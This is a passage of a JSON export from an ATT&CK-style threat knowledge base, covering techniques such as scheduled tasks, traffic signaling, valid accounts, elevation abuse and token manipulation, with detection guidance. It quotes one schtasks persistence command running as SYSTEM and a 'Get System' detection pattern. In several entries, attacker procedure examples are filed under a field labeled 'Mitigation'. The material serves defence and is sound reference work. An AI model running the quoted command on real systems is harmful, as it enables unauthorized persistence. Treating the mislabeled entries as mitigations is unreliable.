    "Description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.[1]Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.[2]",
    "Mitigation": [
      {
        "id": "S1052",
        "name": "DEADEYE",
        "description": "DEADEYE has used the scheduled tasks \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared to establish persistence.[3]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR \"[file path]\" /ru system for persistence.[4]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot's second stage DLL has set a timer using \"timeSetEvent\" to schedule its next execution.[5]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec schedules the execution one of its modules by creating a new scheduler task.[6]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater has create a scheduled task named Mozilla\\Firefox Default Browser Agent 409046Z0FF4A39CB for persistence.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0032",
        "dsource": "Container",
        "dcomp": "Container Creation",
        "detects": "Monitor for newly constructed containers that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor newly constructed files that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0003",
        "dsource": "Scheduled Job",
        "dcomp": "Scheduled Job Creation",
        "detects": "Monitor newly constructed scheduled jobs that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1053.002",
        "name": "At"
      },
      {
        "id": "T1053.003",
        "name": "Cron"
      },
      {
        "id": "T1053.005",
        "name": "Scheduled Task"
      },
      {
        "id": "T1053.006",
        "name": "Systemd Timers"
      },
      {
        "id": "T1053.007",
        "name": "Container Orchestration Job"
      }
    ],
    "Tactic": "Execution, Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Server Software Component",
    "Code": "T1505",
    "Description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.[1]",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made."
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": "Ensure all application component binaries are signed by the correct application developers."
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": "Consider disabling software components from servers when possible to prevent abuse by adversaries.[2]"
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Do not allow administrator accounts that have permissions to add component software on these services to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": "Consider using Group Policy to configure and block modifications to service and other critical server parameters in the Registry.[3]"
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Enforce the principle of least privilege by limiting privileges of user accounts so only authorized accounts can modify and/or add server software components.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may abuse legitimate extensible development features of servers to establish persistent access to systems. Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. [5]"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may abuse legitimate extensible development features of servers to establish persistent access to systems."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)). [5]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Process monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1505.001",
        "name": "SQL Stored Procedures"
      },
      {
        "id": "T1505.002",
        "name": "Transport Agent"
      },
      {
        "id": "T1505.003",
        "name": "Web Shell"
      },
      {
        "id": "T1505.004",
        "name": "IIS Components"
      },
      {
        "id": "T1505.005",
        "name": "Terminal Services DLL"
      }
    ],
    "Tactic": "\nPersistence"
  },
  {
    "Title": "Traffic Signaling",
    "Code": "T1205",
    "Description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r [1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.[2][3][4]  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.[5][6]",
    "Mitigation": [
      {
        "id": "S0220",
        "name": "Chaos",
        "description": "Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.[7]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port.[8][9]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command.[10]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin will connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions.[11][12]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement.[5]"
      },
      {
        "id": "S0519",
        "name": "SYNful Knock",
        "description": "SYNful Knock can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.[3]"
      },
      {
        "id": "S0221",
        "name": "Umbreon",
        "description": "Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet.[13]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific Uroburos implant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application.[14]"
      },
      {
        "id": "S0430",
        "name": "Winnti for Linux",
        "description": "Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism.[15]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze network packet contents to detect application layer protocols, leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, protocol port mismatch, anomalous syntax, or structure). Consider packet inspection for Wake-on-LAN magic packet consists of 6 bytes of FF followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.[16]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor and analyze network flows associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider analyzing newly constructed network connections that are sent or received by untrusted hosts, unexpcted hardware devices, or other uncommon data flows."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.[17]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1205.001",
        "name": "Port Knocking"
      },
      {
        "id": "T1205.002",
        "name": "Socket Filters"
      }
    ],
    "Tactic": "DefenseEvasion, Persistence, CommandandControl"
  },
  {
    "Title": "Valid Accounts",
    "Code": "T1078",
    "Description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1] Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. [4]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 actors leverage legitimate credentials to log into external remote services.[5]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.[6][7][8][9]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used a compromised account to access an organization's VPN infrastructure.[10]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used valid accounts for initial access and privilege escalation.[11][12]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used stolen credentials to compromise Outlook Web Access (OWA).[13]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used compromised credentials to log on to other systems.[14][15]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has used previously compromised administrative accounts to escalate privileges.[16]"
      },
      {
        "id": "G0008",
        "name": "Carbanak",
        "description": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.[17]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used a valid account to maintain persistence via scheduled task.[18]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has compromised user credentials and used valid accounts for operations.[19][20][21]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack used hard-coded credentials to gain access to a network share.[22]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[23]"
      },
      {
        "id": "G0051",
        "name": "FIN10",
        "description": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.[24]"
      },
      {
        "id": "G0085",
        "name": "FIN4",
        "description": "FIN4 has used legitimate credentials to hijack email communications.[25][26]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.[27][28][29]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.[30][31][32]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has harvested valid administrative credentials for lateral movement.[33]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has used valid accounts for persistence and lateral movement.[34]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used valid credentials with various services during lateral movement.[35]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM leveraged valid accounts to maintain access to a victim network.[36]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer can use supplied user credentials to execute processes and stop services.[37]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.[38]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has used valid SSH credentials to access remote hosts.[39]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs.[40][41]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used administrator credentials to gain access to restricted network segments.[42]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has obtained valid accounts to gain initial access.[43][44]"
      },
      {
        "id": "S0362",
        "name": "Linux Rabbit",
        "description": "Linux Rabbit acquires valid SSH accounts through brute force. [45]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.[46][47][48][49]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[50]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used compromised credentials to access other systems on a victim network.[51][52][15]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used valid VPN credentials to gain initial access.[53]"
      },
      {
        "id": "G0011",
        "name": "PittyTiger",
        "description": "PittyTiger attempts to obtain legitimate credentials during operations.[54]"
      },
      {
        "id": "G1005",
        "name": "POLONIUM",
        "description": "POLONIUM has used valid compromised credentials to gain access to victim environments.[55]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team have used previously acquired legitimate credentials prior to attacks.[56]"
      },
      {
        "id": "S0053",
        "name": "SeaDuke",
        "description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[57]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has used compromised credentials to log on to other systems and escalate privileges.[58]"
      },
      {
        "id": "G0122",
        "name": "Silent Librarian",
        "description": "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.[59]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally.[60][61][62]"
      },
      {
        "id": "G0039",
        "name": "Suckfly",
        "description": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.[63]"
      },
      {
        "id": "G0088",
        "name": "TEMP.Veles",
        "description": "TEMP.Veles has used compromised VPN accounts.[64]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.[65]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers.[66][67]"
      }
    ],
    "Detection": [
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Logon Session Metadata",
        "detects": "Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for an attempt by a user that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1078.001",
        "name": "Default Accounts"
      },
      {
        "id": "T1078.002",
        "name": "Domain Accounts"
      },
      {
        "id": "T1078.003",
        "name": "Local Accounts"
      },
      {
        "id": "T1078.004",
        "name": "Cloud Accounts"
      }
    ],
    "Tactic": "DefenseEvasion, Persistence, PrivilegeEscalation, InitialAccess"
  },
  {
    "Title": "Abuse Elevation Control Mechanism",
    "Code": "T1548",
    "Description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[1]"
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": "System settings can prevent applications from running that haven't been downloaded from legitimate repositories which may help mitigate some of these issues. Not allowing unsigned applications from being run may also mitigate some risk."
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": "Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system. Ensuring that the sudo tty_tickets setting is enabled will prevent this leakage across tty sessions."
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Remove users from the local administrator group on systems.By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file. Setting the timestamp_timeout to 0 will require the user to input their password every time sudo is executed."
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": "The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege."
      },
      {
        "id": "M1052",
        "name": "User Account Control",
        "description": "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL Search Order Hijacking."
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Limit the privileges of cloud accounts to assume, create, or impersonate additional roles, policies, and permissions to only those required. Where just-in-time access is enabled, consider requiring manual approval for temporary elevation of privileges."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Metadata",
        "detects": "Monitor the file system for files that have the setuid or setgid bits set. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the LOG_INPUT and LOG_OUTPUT directives in the /etc/sudoers file. Consider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Also look for any process API calls for behavior that may be indicative of Process Injection. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Cyber actors frequently escalate to the SYSTEM account after gaining entry to a Windows host, to enable them to carry out various attacks more effectively. Tools such as Meterpreter, Cobalt Strike, and Empire carry out automated steps to \"Get System\", which is the same as switching over to the System user account. Most of these tools utilize multiple techniques to try and attain SYSTEM: in the first technique, they create a named pipe and connects an instance of cmd.exe to it, which allows them to impersonate the security context of cmd.exe, which is SYSTEM. In the second technique, a malicious DLL is injected into a process that is running as SYSTEM; the injected DLL steals the SYSTEM token and applies it where necessary to escalate privileges. This analytic looks for both of these techniques. Analytic 1 : Get System Elevation  suspicious_processes = filter processes where (  (parent_image_path == C:\\Windows\\System32\\services.exe\" AND   image_path == \"C:\\Windows\\System32\\cmd.exe\" AND   command_line == \"echo\" AND   command_line == \"\\pipe*\") OR  (image_path == \"C:\\Windows\\System32\\rundll32.exe\" AND   command_line == \",a /p:*\"))"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Modification",
        "detects": "Log cloud API calls to assume, create, or impersonate additional roles, policies, and permissions. Review uses of just-in-time access to ensure that any justifications provided are valid and only expected actions were taken."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1548.001",
        "name": "Setuid and Setgid"
      },
      {
        "id": "T1548.002",
        "name": "Bypass User Account Control"
      },
      {
        "id": "T1548.003",
        "name": "Sudo and Sudo Caching"
      },
      {
        "id": "T1548.004",
        "name": "Elevated Execution with Prompt"
      },
      {
        "id": "T1548.005",
        "name": "Temporary Elevated Cloud Access"
      }
    ],
    "Tactic": "PrivilegeEscalation, DefenseEvasion"
  },
  {
    "Title": "Access Token Manipulation",
    "Code": "T1134",
    "Description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.[1]Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
    "Mitigation": [
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can gain system level privilege by passing SeDebugPrivilege to the AdjustTokenPrivilege API.[2]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat has the ability modify access tokens.[3][4]"
      },
      {
        "id": "G0108",
        "name": "Blue Mockingbird",
        "description": "Blue Mockingbird has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.[5]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation.[6]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba has used SeDebugPrivilege and AdjustTokenPrivileges to elevate privileges.[7]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "Duqu examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.[8]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can use PowerSploit's Invoke-TokenManipulation to manipulate access tokens.[9]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has used has used Metasploit’s named-pipe impersonation technique to escalate privileges.[10]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can use token manipulation to bypass UAC on Windows7 systems.[11]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can use AdjustTokenPrivileges to grant itself privileges for debugging with SeDebugPrivilege, creating backups with SeBackupPrivilege, loading drivers with SeLoadDriverPrivilege, and shutting down a local system with SeShutdownPrivilege.[12][13]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can adjust token privileges.[14]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk has attempted to get the access token of a process by calling OpenProcessToken. If KillDisk gets the access token, then it attempt to modify the token privileges with AdjustTokenPrivileges.[15]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can use AdjustTokenPrivileges() to elevate privileges.[16]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "MegaCortex can enable SeDebugPrivilege and adjust token privileges.[17]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 can use Invoke-TokenManipulation for manipulating tokens.[18]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit's Invoke-TokenManipulation Exfiltration module can be used to manipulate tokens.[19][20]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege.[21]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver has the ability to manipulate user tokens on targeted Windows systems.[22][23]"
      },
      {
        "id": "S0058",
        "name": "SslMM",
        "description": "SslMM contains a feature to manipulate process privileges and tokens.[24]"
      },
      {
        "id": "S0562",
        "name": "SUNSPOT",
        "description": "SUNSPOT modified its security token to grants itself debugging privileges by adding SeDebugPrivilege.[25]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made to AD settings that may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows.[29]"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls, loaded by a payload, for token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. There are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., LogonUser [30], DuplicateTokenEx[31], and ImpersonateLoggedOnUser[32]). Please see the referenced Windows API pages for more information."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
